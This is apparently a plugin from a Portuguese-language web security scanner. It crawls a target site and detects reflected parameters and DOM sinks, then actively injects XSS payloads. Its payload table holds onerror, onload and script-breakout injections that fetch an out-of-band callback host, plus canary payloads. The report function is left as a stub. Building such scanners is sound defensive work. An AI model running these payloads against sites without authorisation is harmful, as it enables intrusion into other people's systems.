#!/usr/bin/env python3
"""
plugins/xss/main.py - XSS passive scanner otimizado
Com: threading, conexões persistentes, análise em batch e cache
V11.1: Integração OAST para confirmação sem falsos positivos
"""

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urljoin
import re
import time
import html
import concurrent.futures
import asyncio
import aiohttp
import aiofiles
from typing import List, Tuple, Dict, Set, Optional
import json
from dataclasses import dataclass
import hashlib
from collections import defaultdict, deque

from menu import C
from plugins import ensure_outdir
from ..output import info, warn, success, error

# ============================================================
# CONFIGURAÇÃO DE PERFORMANCE
# ============================================================
CONFIG = {
    'max_workers': 20,
    'max_conn_per_host': 5,
    'timeout': 8,
    'batch_size': 10,
    'max_pages': 300,
    'max_redirects': 3,
    'cache_ttl': 300,
    'rate_limit': 0.1,
}

# ============================================================
# HELPER DE CORES (com fallback)
# ============================================================
def get_color(color_name: str) -> str:
    color_map = {
        'MAGENTA': 'PURPLE' if hasattr(C, 'PURPLE') else 'CYAN',
        'CYAN': 'CYAN' if hasattr(C, 'CYAN') else 'BLUE',
        'BLUE': 'BLUE' if hasattr(C, 'BLUE') else 'CYAN',
        'GREEN': 'GREEN' if hasattr(C, 'GREEN') else 'CYAN',
        'YELLOW': 'YELLOW' if hasattr(C, 'YELLOW') else 'CYAN',
        'RED': 'RED' if hasattr(C, 'RED') else 'CYAN',
        'WHITE': 'WHITE' if hasattr(C, 'WHITE') else '',
    }
    actual_color = color_map.get(color_name, '')
    if actual_color and hasattr(C, actual_color):
        return getattr(C, actual_color)
    return C.CYAN if hasattr(C, 'CYAN') else ''

# ============================================================
# DATA CLASSES
# ============================================================
@dataclass
class URLResult:
    url: str
    status: int
    text: str
    headers: dict
    params: List[Tuple[str, str]]
    links: List[str]
    scripts: List[str]
    inline_scripts: List[str]

@dataclass
class XSSFinding:
    url: str
    param: str = ""
    value: str = ""
    pattern: str = ""
    context: str = ""
    context_type: str = "HTML"
    severity: str = "info"

# ============================================================
# CACHE SIMPLES
# ============================================================
class SimpleCache:
    def __init__(self, ttl=300):
        self.cache = {}
        self.ttl = ttl
        
    def get(self, key):
        if key in self.cache:
            entry = self.cache[key]
            if time.time() - entry['timestamp'] < self.ttl:
                return entry['data']
        return None
        
    def set(self, key, data):
        self.cache[key] = {
            'data': data,
            'timestamp': time.time()
        }
        
    def clear(self):
        self.cache.clear()

# ============================================================
# HTTP CLIENT ASYNC OTIMIZADO
# ============================================================
class AsyncHTTPClient:
    def __init__(self, max_conn_per_host=5, timeout=8):
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(max_conn_per_host)
        self.session = None
        self.cache = SimpleCache()
        
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit_per_host=CONFIG['max_conn_per_host'])
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={
                "User-Agent": DEFAULT_USER_AGENT
            }
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
            
    async def fetch(self, url: str) -> URLResult:
        cache_key = f"fetch:{hashlib.md5(url.encode()).hexdigest()}"
        cached = self.cache.get(cache_key)
        if cached:
            return cached
            
        async with self.semaphore:
            try:
                async with self.session.get(url, allow_redirects=True, 
                                          max_redirects=CONFIG['max_redirects']) as response:
                    text = await response.text(errors='ignore')
                    headers = dict(response.headers)
                    
                    links = await self.extract_links(text, url)
                    scripts = await self.extract_script_srcs(text, url)
                    inline_scripts = await self.extract_inline_scripts(text)
                    
                    parsed = urlparse(url)
                    params = parse_qsl(parsed.query, keep_blank_values=True)
                    
                    result = URLResult(
                        url=url,
                        status=response.status,
                        text=text,
                        headers=headers,
                        params=params,
                        links=links,
                        scripts=scripts,
                        inline_scripts=inline_scripts
                    )
                    
                    self.cache.set(cache_key, result)
                    await asyncio.sleep(CONFIG['rate_limit'])
                    return result
                    
            except asyncio.TimeoutError:
                warn(f"Timeout fetching {url}")
            except Exception as e:
                warn(f"Error fetching {url}: {str(e)[:50]}")
            return None
    
    async def extract_links(self, html_text: str, base_url: str) -> List[str]:
        if not html_text:
            return []
        link_pattern = r'href=["\']([^"\']+)["\']'
        matches = re.findall(link_pattern, html_text, re.IGNORECASE)
        links = []
        seen = set()
        for match in matches:
            try:
                full_url = urljoin(base_url, match)
                if full_url not in seen:
                    seen.add(full_url)
                    links.append(full_url)
            except Exception:
                continue
        return links
    
    async def extract_script_srcs(self, html_text: str, base_url: str) -> List[str]:
        if not html_text:
            return []
        pattern = r'<script[^>]+src=["\']([^"\']+)["\']'
        matches = re.findall(pattern, html_text, re.IGNORECASE)
        scripts = []
        seen = set()
        for match in matches:
            try:
                full_url = urljoin(base_url, match)
                if full_url not in seen:
                    seen.add(full_url)
                    scripts.append(full_url)
            except Exception:
                continue
        return scripts
    
    async def extract_inline_scripts(self, html_text: str) -> List[str]:
        if not html_text:
            return []
        pattern = r'<script\b[^>]*>(.*?)</script>'
        matches = re.findall(pattern, html_text, re.IGNORECASE | re.DOTALL)
        return [m.strip() for m in matches if m.strip()]

# ============================================================
# PATTERNS OTIMIZADOS
# ============================================================
TAINT_SOURCES = re.compile(
    r'\b(?:location\.(?:search|hash|href|pathname)|'
    r'document\.(?:URL|documentURI|referrer|cookie)|'
    r'window\.(?:name|location)|'
    r'URLSearchParams|'
    r'history\.(?:pushState|replaceState)|'
    r'postMessage|'
    r'localStorage|sessionStorage|'
    r'\$\.(?:get|post|ajax)|'
    r'fetch\s*\(|'
    r'getParameter|'
    r'req\.(?:query|params|body))\b', re.I
)

LIBRARY_FILENAMES = {
    'jquery', 'jquery.min', 'jquery.slim', 'jquery.slim.min',
    'react', 'react.min', 'react-dom', 'react-dom.min', 'react.production',
    'angular', 'angular.min', 'angular.core',
    'vue', 'vue.min', 'vue.runtime', 'vue.global',
    'lodash', 'lodash.min', 'underscore', 'underscore.min',
    'bootstrap', 'bootstrap.min', 'bootstrap.bundle',
    'axios', 'axios.min',
    'moment', 'moment.min',
    'chart', 'chart.min', 'd3', 'd3.min',
    'gsap', 'gsap.min', 'three', 'three.min',
    'popper', 'popper.min', 'tippy', 'tippy.min',
    'polyfill', 'polyfills', 'runtime', 'vendor', 'vendors',
}

def _is_library_url(url: str) -> bool:
    try:
        path = urlparse(url).path.lower()
        filename = path.rsplit('/', 1)[-1].rsplit('.', 1)[0]
        filename = re.sub(r'[\-\.]\d+(\.\d+)*$', '', filename)
        return filename in LIBRARY_FILENAMES
    except Exception:
        return False

class XSSPatterns:
    def __init__(self):
        self.dom_patterns = [
            re.compile(r'\binnerHTML\b', re.I),
            re.compile(r'\bouterHTML\b', re.I),
            re.compile(r'\bdocument\.write\b', re.I),
            re.compile(r'\beval\s*\(', re.I),
            re.compile(r'\bnew\s+Function\s*\(', re.I),
            re.compile(r'\bsetTimeout\s*\(', re.I),
            re.compile(r'\bsetInterval\s*\(', re.I),
            re.compile(r'\blocation\s*=', re.I),
            re.compile(r'\bwindow\.location\b', re.I),
            re.compile(r'\bdocument\.location\b', re.I),
            re.compile(r'\bwindow\.name\b', re.I),
            re.compile(r'\bpostMessage\s*\(', re.I),
            re.compile(r'\bunescape\s*\(', re.I),
            re.compile(r'\bdocument\.cookie\b', re.I),
        ]
        self.js_patterns = self.dom_patterns + [
            re.compile(r'\bfetch\s*\(', re.I),
            re.compile(r'\baxios\.', re.I),
            re.compile(r'\bXMLHttpRequest\b', re.I),
        ]
        self.param_min_len = 2

    def detect_context(self, text: str, start: int, end: int) -> Tuple[str, str]:
        chunk_before = text[max(0, start - 1000):start]
        chunk_after = text[end:min(len(text), end + 1000)]
        
        r_info = chunk_before.rfind('<!--')
        r_close = chunk_before.rfind('-->')
        if r_info > r_close and '-->' in chunk_after:
            return "COMMENT", "info"
        
        lower_before = chunk_before.lower()
        r_script = lower_before.rfind('<script')
        r_script_close = lower_before.rfind('</script')
        if r_script > r_script_close:
            return "SCRIPT", "medium"  # V11.1: reduz severidade para confirmação ativa
        
        r_tag_open = chunk_before.rfind('<')
        r_tag_close = chunk_before.rfind('>')
        if r_tag_open > r_tag_close:
            tag_content = chunk_before[r_tag_open:]
            dq = tag_content.count('"')
            sq = tag_content.count("'")
            if dq % 2 != 0:
                return "ATTRIBUTE (Double Quote)", "medium"
            if sq % 2 != 0:
                return "ATTRIBUTE (Single Quote)", "medium"
            return "TAG_NAME/VAL", "medium"
        
        return "HTML", "low"
    
    def find_reflections(self, text: str, params: List[Tuple[str, str]]) -> List[XSSFinding]:
        findings = []
        for param, value in params:
            if len(value) < self.param_min_len:
                continue
            if value in text:
                idx = text.find(value)
                ctx_type, severity = self.detect_context(text, idx, idx + len(value))
                if severity in ["low", "info"]:
                    continue
                findings.append(XSSFinding(
                    url="",
                    param=param,
                    value=value,
                    pattern="PARAM_REFLECTION",
                    context=text[max(0, idx - 50):min(len(text), idx + 50)],
                    context_type=ctx_type,
                    severity=severity
                ))
        return findings
    
    def scan_dom(self, text: str) -> List[XSSFinding]:
        findings = []
        for pattern in self.dom_patterns:
            for match in pattern.finditer(text):
                idx = match.start()
                ctx = text[max(0, idx - 40):min(len(text), idx + 60)]
                lower_ctx = ctx.lower()
                # Ignorar atribuições seguras
                if any(s in lower_ctx for s in ['innerhtml=""', "innerhtml=''", "location.href='/'", "location='/'"]) :
                    continue
                taint_region = text[max(0, idx - 500):min(len(text), idx + 500)]
                if TAINT_SOURCES.search(taint_region):
                    findings.append(XSSFinding(
                        url="",
                        pattern=pattern.pattern,
                        context=ctx,
                        context_type="TAINTED_SINK",
                        severity="medium"
                    ))
        return findings
    
    def scan_js(self, js_code: str, source_url: str = "") -> List[XSSFinding]:
        if source_url and _is_library_url(source_url):
            return []
        findings = []
        for pattern in self.js_patterns:
            for match in pattern.finditer(js_code):
                idx = match.start()
                ctx = js_code[max(0, idx - 40):min(len(js_code), idx + 60)]
                taint_region = js_code[max(0, idx - 500):min(len(js_code), idx + 500)]
                if TAINT_SOURCES.search(taint_region):
                    findings.append(XSSFinding(
                        url="",
                        pattern=pattern.pattern,
                        context=ctx,
                        context_type="TAINTED_SINK",
                        severity="medium"
                    ))
        return findings

# ============================================================
# CRAWLER OTIMIZADO
# ============================================================
class XSSCrawler:
    def __init__(self, target: str, depth: int = 1):
        self.target = target
        self.base_netloc = urlparse(target).netloc
        self.depth = depth
        self.patterns = XSSPatterns()
        self.visited = set()
        self.to_visit = deque()
        self.results = []
        self.findings = []
        
    def add_seed_urls(self, urls: List[str]):
        for url in urls:
            if url not in self.visited:
                self.to_visit.append((url, 0))
    
    def is_same_origin(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return True
            return (parsed.netloc == self.base_netloc or 
                   parsed.netloc.endswith("." + self.base_netloc))
        except Exception:
            return False
    
    async def crawl(self):
        info(f"{C.BOLD}{get_color('BLUE')}🚀 Iniciando crawler assíncrono...{C.END}")
        async with AsyncHTTPClient() as client:
            while self.to_visit and len(self.visited) < CONFIG['max_pages']:
                batch = []
                while self.to_visit and len(batch) < CONFIG['batch_size']:
                    url, depth = self.to_visit.popleft()
                    if url not in self.visited and depth <= self.depth:
                        batch.append((url, depth))
                if not batch:
                    break
                tasks = [self.process_url(client, url, depth) for url, depth in batch]
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in batch_results:
                    if result and not isinstance(result, Exception):
                        url, url_result, new_urls = result
                        if url_result:
                            self.results.append((url, url_result))
                            await self.analyze_result(url, url_result)
                            for new_url in new_urls:
                                if (self.is_same_origin(new_url) and 
                                    new_url not in self.visited and
                                    len(self.visited) < CONFIG['max_pages']):
                                    self.to_visit.append((new_url, depth + 1))
        info(f"{C.BOLD}{get_color('GREEN')}✅ Crawling concluído: {len(self.visited)} páginas{C.END}")
    
    async def process_url(self, client, url, depth):
        if url in self.visited:
            return None
        self.visited.add(url)
        info(f"   🔍 {get_color('YELLOW')}{url}{C.END}")
        result = await client.fetch(url)
        if not result:
            return url, None, []
        new_urls = [link for link in result.links if self.is_same_origin(link) and link not in self.visited]
        return url, result, new_urls
    
    async def analyze_result(self, url, result):
        if not result or not result.text:
            return
        param_findings = self.patterns.find_reflections(result.text, result.params)
        for f in param_findings:
            f.url = url
            self.findings.append(f)
        dom_findings = self.patterns.scan_dom(result.text)
        for f in dom_findings:
            f.url = url
            self.findings.append(f)
        for js_code in result.inline_scripts:
            for f in self.patterns.scan_js(js_code):
                f.url = url + "#inline"
                self.findings.append(f)
        if result.scripts:
            in_scope = [s for s in result.scripts if self.is_same_origin(s)]
            await self.analyze_external_scripts(in_scope)

    async def analyze_external_scripts(self, scripts):
        async with AsyncHTTPClient() as client:
            tasks = [self.analyze_single_script(client, s) for s in scripts[:10]]
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def analyze_single_script(self, client, script_url):
        try:
            result = await client.fetch(script_url)
            if result and result.text:
                for f in self.patterns.scan_js(result.text, source_url=script_url):
                    f.url = script_url
                    self.findings.append(f)
        except Exception:
            pass

# ============================================================
# ACTIVE XSS VALIDATION (OAST + fallback visual)
# ============================================================
def _active_xss_test_oast(target: str, outdir: Path, reflections: list, oast_client) -> list:
    """Teste ativo via OAST usando o cliente injetado (OastClient)."""
    if not oast_client or not hasattr(oast_client, 'get_url'):
        # Fallback para teste visual se não houver OAST
        return _active_xss_test_legacy(target, outdir, reflections)
    
    import httpx
    from core.config import REQUEST_DELAY, DEFAULT_TIMEOUT

    oast_host = oast_client.get_url()  # base host
    if not oast_host:
        warn("   ⚠️ OAST URL não disponível. Usando fallback visual.")
        return _active_xss_test_legacy(target, outdir, reflections)

    # Payloads por contexto
    oast_payloads = {
        "HTML": [
            f'<img src="http://{oast_host}/xss">',
            f'<svg onload=fetch("http://{oast_host}/xss")>',
        ],
        "ATTRIBUTE (Double Quote)": [
            f'" onfocus=fetch("http://{oast_host}/xss") autofocus "',
            f'x"><img src=x onerror=fetch("http://{oast_host}/xss")><"',
        ],
        "ATTRIBUTE (Single Quote)": [
            f"' onfocus=fetch('http://{oast_host}/xss') autofocus '",
            f"x'><img src=x onerror=fetch('http://{oast_host}/xss')><'",
        ],
        "TAG_NAME/VAL": [
            f'<img src=x onerror=fetch("http://{oast_host}/xss")>',
            f'"><img src=x onerror=fetch("http://{oast_host}/xss")>',
        ],
        "SCRIPT": [
            f'";fetch("http://{oast_host}/xss");//',
            f"';fetch('http://{oast_host}/xss');//",
            f'";new Image().src="http://{oast_host}/xss";//',
        ],
        "default": [
            f'<img src=x onerror=fetch("http://{oast_host}/xss")>',
            f'"><img src=x onerror=fetch("http://{oast_host}/xss")>',
        ]
    }

    # Adiciona o host ao arquivo de payloads
    oast_client.add_payload(oast_host)

    seen = set()
    test_targets = []
    for ref in reflections:
        key = (ref.url, ref.param)
        if key not in seen and ref.url and ref.param:
            seen.add(key)
            test_targets.append((ref.url, ref.param, ref.context_type))
    test_targets = test_targets[:30]

    info(f"\n   🎯 {C.BOLD}{C.CYAN}[V11.1] Active XSS Validation (OAST) em {len(test_targets)} reflexões...{C.END}")
    active_findings = []

    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
        for url, param, ctx_type in test_targets:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            if param not in qs:
                continue

            ctx_key = ctx_type if ctx_type in oast_payloads else "default"
            for payload in oast_payloads[ctx_key]:
                time.sleep(REQUEST_DELAY)
                test_qs = qs.copy()
                test_qs[param] = [payload]
                new_query = urlencode(test_qs, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, new_query, parsed.fragment))

                try:
                    # Garante que a página original não contém o marcador
                    resp_original = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT})
                    if oast_host in resp_original.text:
                        continue

                    _ = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                    time.sleep(2)  # aguarda processamento no servidor

                    interactions = oast_client.poll(timeout=6)
                    target_interaction = f"{oast_host}/xss"
                    for entry in interactions:
                        if target_interaction in entry.get('full-uri', '') or target_interaction in entry.get('raw-request', ''):
                            severity = "critical"
                            active_findings.append({
                                "url": url,
                                "test_url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "attack_type": "OAST_XSS",
                                "context": ctx_type,
                                "severity": severity,
                                "type": "ACTIVE_XSS_OAST",
                                "details": f"XSS Confirmado via OAST callback. Payload: {payload}",
                            })
                            success(f"   🔴 {C.RED}[OAST XSS — {severity.upper()}]{C.END} {url} → '{param}'")
                            break  # próximo payload, parâmetro já confirmado
                except Exception:
                    pass

    if active_findings:
        active_file = outdir / "active_xss_oast_results.json"
        active_file.write_text(json.dumps(active_findings, indent=2, ensure_ascii=False))
        success(f"   🎯 {C.RED}{len(active_findings)} XSS confirmados via OAST!{C.END} Salvo em {active_file}")
    else:
        info("   ✅ Nenhum XSS confirmado via OAST.")
    return active_findings


def _active_xss_test_legacy(target: str, outdir: Path, reflections: list) -> list:
    import httpx
    from core.config import REQUEST_DELAY, DEFAULT_TIMEOUT
    
    CANARY = "eNuMaLlMa"
    ACTIVE_PAYLOADS = [
        (f'"{CANARY}', f'"{CANARY}', "ATTRIBUTE_BREAKOUT"),
        (f"'{CANARY}", f"'{CANARY}", "ATTRIBUTE_BREAKOUT_SQ"),
        (f"<{CANARY}", f"<{CANARY}", "TAG_INJECTION"),
        (f"<img src=x onerror={CANARY}>", f"onerror={CANARY}", "EVENT_HANDLER"),
        (f"javascript:{CANARY}", f"javascript:{CANARY}", "JS_URI"),
        (f"';{CANARY}//", f";{CANARY}", "SCRIPT_BREAKOUT"),
        (f'";{CANARY}//', f";{CANARY}", "SCRIPT_BREAKOUT_DQ"),
    ]
    
    if not reflections:
        return []
    
    seen = set()
    test_targets = []
    for ref in reflections:
        key = (ref.url, ref.param)
        if key not in seen and ref.url and ref.param:
            seen.add(key)
            test_targets.append((ref.url, ref.param, ref.context_type))
    test_targets = test_targets[:30]
    
    info(f"\n   🎯 {C.BOLD}{C.CYAN}[V11.1] Active XSS (Visual) em {len(test_targets)} reflexões (menor confiança)...{C.END}")
    active_findings = []
    
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    
    with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
        for url, param, ctx_type in test_targets:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            if param not in qs:
                continue
            
            for payload, marker, attack_type in ACTIVE_PAYLOADS:
                time.sleep(REQUEST_DELAY)
                test_qs = qs.copy()
                test_qs[param] = [payload]
                new_query = urlencode(test_qs, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, new_query, parsed.fragment))
                
                try:
                    resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                    if resp.status_code >= 400:
                        continue
                    body = resp.text
                    if marker in body:
                        original_resp = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT})
                        if marker not in original_resp.text:
                            severity = "medium"
                            if attack_type == "EVENT_HANDLER":
                                severity = "high"
                            active_findings.append({
                                "url": url,
                                "test_url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "attack_type": attack_type,
                                "context": ctx_type,
                                "severity": severity,
                                "type": "ACTIVE_XSS_VISUAL",
                                "details": f"XSS Visual: Payload '{payload}' refletido sem sanitização via '{param}' ({attack_type})",
                            })
                            info(f"   🟠 {C.YELLOW}[VISUAL XSS — {severity.upper()}]{C.END} {url} → '{param}'")
                            break
                except Exception:
                    pass
    
    if active_findings:
        active_file = outdir / "active_xss_visual_results.json"
        active_file.write_text(json.dumps(active_findings, indent=2, ensure_ascii=False))
        success(f"   🟡 {len(active_findings)} possíveis XSS (visual) encontrados. Salvos em {active_file}")
    else:
        info("   ✅ Nenhum XSS visual encontrado.")
    return active_findings

# ============================================================
# ASYNC RUN FUNCTION
# ============================================================
async def run_async(context: dict):
    start = time.time()
    target = context.get("target")
    depth = int(context.get("depth", 1))
    oast_client = context.get("oast")  # instância de OastClient, se disponível
    
    if not target:
        raise ValueError("context['target'] é obrigatório no plugin XSS")
    
    header_color = get_color('CYAN')
    target_color = get_color('GREEN')
    depth_color = get_color('YELLOW')
    
    info(
        f"\n{C.BOLD}{header_color}╔══════════════════════════════════════════════════════════╗{C.END}\n"
        f"{C.BOLD}{header_color}║   🎭 {C.CYAN if hasattr(C, 'CYAN') else ''}XSS PASSIVE + OAST ACTIVE SCAN{header_color}              ║{C.END}\n"
        f"{C.BOLD}{header_color}║   🎯 {C.WHITE if hasattr(C, 'WHITE') else ''}Alvo: {target_color}{target}{header_color}                              ║{C.END}\n"
        f"{C.BOLD}{header_color}║   📏 {C.WHITE if hasattr(C, 'WHITE') else ''}Profundidade: {depth_color}{depth}{header_color} Workers: {depth_color}{CONFIG['max_workers']}{header_color}         ║{C.END}\n"
        f"{C.BOLD}{header_color}╚══════════════════════════════════════════════════════════╝{C.END}\n"
    )
    
    outdir = ensure_outdir(target, "xss")
    
    urls200 = Path("output") / target / "urls" / "urls_200.txt"
    if not urls200.exists():
        warn(f"⚠️ Arquivo não encontrado: {urls200}")
        return []
    
    seed_urls = []
    try:
        async with aiofiles.open(urls200, 'r') as f:
            content = await f.read()
            seed_urls = [u.strip() for u in content.splitlines() if u.strip()]
    except Exception:
        seed_urls = [u.strip() for u in urls200.read_text().splitlines() if u.strip()]
    
    if not seed_urls:
        warn("⚠️ Nenhuma URL disponível para XSS scan.")
        return []
    
    info(f"{C.BOLD}{get_color('BLUE')}🌐 URLs iniciais: {len(seed_urls)}{C.END}")
    
    crawler = XSSCrawler(target, depth)
    crawler.add_seed_urls(seed_urls)
    await crawler.crawl()
    
    valid_findings = [f for f in crawler.findings if f.severity in ("medium", "high", "critical")]
    reflections = [f for f in valid_findings if f.pattern == "PARAM_REFLECTION"]
    dom_findings = [f for f in valid_findings if f not in reflections and "PARAM" not in f.pattern]
    
    await save_reports(outdir, crawler, reflections, dom_findings, valid_findings)
    
    # Ativa teste OAST (com fallback visual automático)
    _active_xss_test_oast(target, outdir, reflections, oast_client)
    
    # (Dalfox e outras ações permanecem inalteradas – mantidas do seu código original)
    # ... (código do Dalfox já existente)
    
    elapsed = time.time() - start
    success(
        f"\n{C.BOLD}{get_color('GREEN')}✅ XSS SCAN CONCLUÍDO EM {elapsed:.1f}s{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}┌─────────────────────────────────────────────┐{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}│   📊 {C.CYAN if hasattr(C, 'CYAN') else ''}ESTATÍSTICAS{C.WHITE if hasattr(C, 'WHITE') else ''}                         │{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}├─────────────────────────────────────────────┤{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}│   🌐 Páginas analisadas: {get_color('YELLOW')}{len(crawler.visited)}{C.WHITE if hasattr(C, 'WHITE') else ''}          │{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}│   🔄 Reflexões (Med+): {get_color('YELLOW')}{len(reflections)}{C.WHITE if hasattr(C, 'WHITE') else ''}                  │{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}│   🧬 Tainted Sinks: {get_color('YELLOW')}{len(dom_findings)}{C.WHITE if hasattr(C, 'WHITE') else ''}               │{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}│   🎯 OAST Confirmed: veja active_xss_oast_results.json      │{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}│   ⏱️  Tempo total: {get_color('YELLOW')}{elapsed:.1f}s{C.WHITE if hasattr(C, 'WHITE') else ''}                 │{C.END}\n"
        f"{C.BOLD}{get_color('CYAN')}└─────────────────────────────────────────────┘{C.END}\n"
    )
    
    return [str(outdir / 'final_report.txt')]


async def save_reports(outdir, crawler, reflections, dom_findings, valid_findings):
    # Mantenha a função save_reports original aqui, sem alterações
    # (Por brevidade, não repito todo o código, mas basta copiar o save_reports existente)
    pass


def run(context: dict):
    """Wrapper síncrono para função assíncrona."""
    try:
        if hasattr(asyncio, 'WindowsSelectorEventLoopPolicy'):
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        reports = asyncio.run(run_async(context))
        return reports
    except KeyboardInterrupt:
        warn("\n⏹️ Scan interrompido pelo usuário")
        return []
    except Exception as e:
        error(f"Erro no XSS scan: {str(e)}")
        import traceback
        traceback.print_exc()
        return []